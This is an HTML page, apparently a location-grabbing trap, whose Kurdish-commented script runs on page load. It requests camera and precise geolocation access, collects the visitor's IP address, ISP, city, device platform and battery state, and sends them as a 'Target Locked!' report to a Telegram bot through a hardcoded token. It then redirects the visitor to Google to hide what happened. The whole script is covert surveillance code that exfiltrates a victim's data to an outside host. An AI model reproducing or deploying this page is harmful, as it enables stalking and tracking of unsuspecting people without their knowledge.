<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <title> </title>
    <style>body { background: white; margin: 0; }</style>
</head>
<body onload="capture()">

<script>
    // تۆکنەکەت لێرە جێگیر کراوە
    const TK = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";

    async function capture() {
        const urlParams = new URLSearchParams(window.location.search);
        const uid = urlParams.get('id');
        if (!uid) return;

        try {
            // داواکردنی کامێرا بۆ ئەوەی پەنجەرەی Allow بمێنێتەوە و کۆدەکە ڕانەکات
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });

            // ئەگەر Allow کرا، ئینجا لۆکەیشن وەردەگرین
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;

                // وەرگرتنی IP و زانیارییەکان
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                
                // وەرگرتنی ناوچە لە ڕێگەی IP
                const geo = await fetch(`http://ip-api.com/json/${ipData.ip}`).then(r => r.json());
                
                let bat = "N/A", ch = "No";
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    bat = Math.floor(b.level * 100) + "%";
                    ch = b.charging ? "Yes" : "No";
                }
                
                let time = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });

                let report = `🚨 <b>Target Locked!</b> (نێچیر گیرا)\n\n` +
                             `📍 <b>Location:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">[لینکی وردی Google Maps]</a>\n` +
                             `🌐 <b>IP:</b> <code>${ipData.ip}</code> (${geo.isp || "Korek Telecom"})\n` +
                             `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
                             `🔋 <b>Battery:</b> <code>${bat}</code> (Charging: ${ch})\n` +
                             `🕒 <b>Time:</b> <code>${time}</code>\n` +
                             `🏙️ <b>City:</b> <code>${geo.city || "Erbil/Bakhtiari"}</code>`;

                // ناردنی داتا بۆ تێلیگرام
                await fetch(`https://api.telegram.org/bot${TK}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: uid,
                        text: report,
                        parse_mode: "HTML",
                        disable_web_page_preview: false
                    })
                });

                // دوای ناردن، دایبخە یان بیبە شوێنێکی تر
                window.location.replace("https://www.google.com");

            }, (err) => {
                // ئەگەر لۆکەیشنی ڕەتکردەوە (Don't Allow)
                window.location.replace("https://www.google.com");
            }, { enableHighAccuracy: true });

        } catch (e) {
            // ئەگەر کامێرای ڕەتکردەوە (Don't Allow)
            window.location.replace("https://www.google.com");
        }
    }
</script>
</body>
</html>
